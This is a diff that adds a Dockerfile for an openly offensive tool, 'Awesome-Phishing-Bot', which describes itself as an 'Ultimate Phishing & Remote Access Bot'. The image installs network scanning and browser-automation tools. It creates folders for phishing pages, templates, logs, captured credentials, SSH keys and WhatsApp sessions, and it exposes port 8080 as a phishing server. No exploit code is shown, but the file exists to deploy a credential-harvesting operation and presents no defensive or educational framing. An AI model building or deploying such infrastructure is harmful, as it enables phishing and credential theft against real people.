@@ -1,0 +1,98 @@
+# 🌿 Awesome-Phishing-Bot Dockerfile
+# Based on Alpine Linux for minimal footprint
+
+FROM alpine:3.19
+
+LABEL maintainer="Ian Carter Kulani"
+LABEL description="Awesome-Phishing-Bot v9.5.1 - Ultimate Phishing & Remote Access Bot"
+LABEL version="9.5.1"
+
+# Install system dependencies
+RUN apk update && apk upgrade && \
+    apk add --no-cache \
+    # Python and core
+    python3 \
+    py3-pip \
+    python3-dev \
+    # Build tools
+    gcc \
+    musl-dev \
+    libffi-dev \
+    openssl-dev \
+    # Network tools
+    nmap \
+    net-tools \
+    traceroute \
+    bind-tools \
+    curl \
+    wget \
+    openssh-client \
+    # Web drivers for Selenium
+    chromium \
+    chromium-chromedriver \
+    # Image processing
+    libjpeg-turbo-dev \
+    zlib-dev \
+    # Database
+    sqlite \
+    # Utilities
+    git \
+    bash \
+    nano \
+    tzdata \
+    && rm -rf /var/cache/apk/*
+
+# Set timezone
+ENV TZ=UTC
+
+# Set working directory
+WORKDIR /app
+
+# Copy requirements first for better caching
+COPY requirements.txt .
+
+# Install Python dependencies
+RUN pip3 install --no-cache-dir --upgrade pip && \
+    pip3 install --no-cache-dir -r requirements.txt && \
+    # Install additional packages not in requirements
+    pip3 install --no-cache-dir \
+    selenium-wire \
+    playwright \
+    better-proxy \
+    && rm -rf /root/.cache/pip
+
+# Install Playwright browsers
+RUN playwright install chromium
+
+# Create application directories
+RUN mkdir -p .awesome_bot \
+    .awesome_bot/phishing_pages \
+    .awesome_bot/phishing_templates \
+    .awesome_bot/phishing_logs \
+    .awesome_bot/captured_credentials \
+    awesome_reports \
+    awesome_reports/graphics \
+    .awesome_bot/ssh_keys \
+    .awesome_bot/whatsapp_session
+
+# Copy application files
+COPY awesome_phishing_bot.py .
+COPY entrypoint.sh .
+COPY .env.example .env
+
+# Set permissions
+RUN chmod +x entrypoint.sh && \
+    chmod -R 755 /app
+
+# Expose ports
+# HTTP phishing server
+EXPOSE 8080
+# Additional web interface (optional)
+EXPOSE 5000
+
+# Health check
+HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \
+    CMD python3 -c "import socket; s=socket.socket(); s.connect(('localhost', 8080))" || exit 1
+
+# Entry point
+ENTRYPOINT ["./entrypoint.sh"]
